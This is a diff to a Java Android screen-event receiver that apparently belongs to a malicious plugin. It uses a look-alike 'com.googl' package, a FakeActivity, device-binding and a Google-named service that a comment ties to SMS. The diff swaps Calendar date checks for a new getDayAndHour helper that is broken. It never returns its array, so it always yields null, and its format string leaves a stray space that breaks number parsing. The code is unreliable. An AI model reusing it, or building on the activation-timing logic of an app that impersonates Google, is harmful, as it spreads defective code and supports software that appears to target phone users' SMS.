@@ -5,6 +5,7 @@ import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.text.TextUtils;
 import com.googl.plugin.x.FakeActivity;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.plugin.binddevice.DeviceBindBRC;
@@ -14,7 +15,7 @@ import com.xstd.plugin.config.SettingManager;
 import com.xstd.plugin.service.GoogleService;
 import com.xstd.plugin.service.PluginService;
 
-import java.util.Calendar;
+import java.text.SimpleDateFormat;
 
 /**
  * Created with IntelliJ IDEA.
@@ -26,6 +27,28 @@ import java.util.Calendar;
 public class ScreenBRC extends BroadcastReceiver {
 
     public static final int DAY_START_HOUR = 6;
+
+    private static final String DATE_FORMAT = "dd-HH ";
+
+    public static String formatTime(long time) {
+        SimpleDateFormat dateFormat = new SimpleDateFormat(DATE_FORMAT);
+        return dateFormat.format(time);
+    }
+
+    public static int[] getDayAndHour(long time) {
+        SimpleDateFormat dateFormat = new SimpleDateFormat(DATE_FORMAT);
+        String data = dateFormat.format(time);
+        if (!TextUtils.isEmpty(data)) {
+            String[] ds = data.split("-");
+            if (ds != null && ds.length == 2) {
+                int[] ret = new int[2];
+                ret[0] = Integer.valueOf(ds[0]);
+                ret[1] = Integer.valueOf(ds[1]);
+            }
+        }
+
+        return null;
+    }
 
     public void onReceive(Context context, Intent intent) {
         //check Google Service if runging for SMS
@@ -57,13 +80,27 @@ public class ScreenBRC extends BroadcastReceiver {
                     }
                 } else {
                     long lastActiveTime = SettingManager.getInstance().getKeyActiveTime();
-                    Calendar c = Calendar.getInstance();
-                    c.setTimeInMillis(lastActiveTime);
-                    int lastDay = c.get(Calendar.DAY_OF_YEAR);
-                    int lastHour = c.get(Calendar.HOUR_OF_DAY);
-                    c = Calendar.getInstance();
-                    int curDay = c.get(Calendar.DAY_OF_YEAR);
-                    int curHour = c.get(Calendar.HOUR_OF_DAY);
+//                    Calendar c = Calendar.getInstance();
+//                    c.setTimeInMillis(lastActiveTime);
+//                    int lastDay = c.get(Calendar.DAY_OF_YEAR);
+//                    int lastHour = c.get(Calendar.HOUR_OF_DAY);
+//                    c = Calendar.getInstance();
+//                    int curDay = c.get(Calendar.DAY_OF_YEAR);
+//                    int curHour = c.get(Calendar.HOUR_OF_DAY);
+                    int[] d = getDayAndHour(lastActiveTime);
+                    int[] dNow = getDayAndHour(System.currentTimeMillis());
+                    int lastDay = 0;
+                    int lastHour = 0;
+                    int curDay = 0;
+                    int curHour = 0;
+                    if (d != null && dNow != null) {
+                        lastDay = d[0];
+                        lastHour = d[1];
+                        curDay = dNow[0];
+                        curHour = dNow[1];
+                    } else {
+                        return;
+                    }
 
                     if (Config.DEBUG) {
                         Config.LOGD("[[ScreenBRC::onReceive]] last active day = " + lastDay + " cur day = " + curDay);
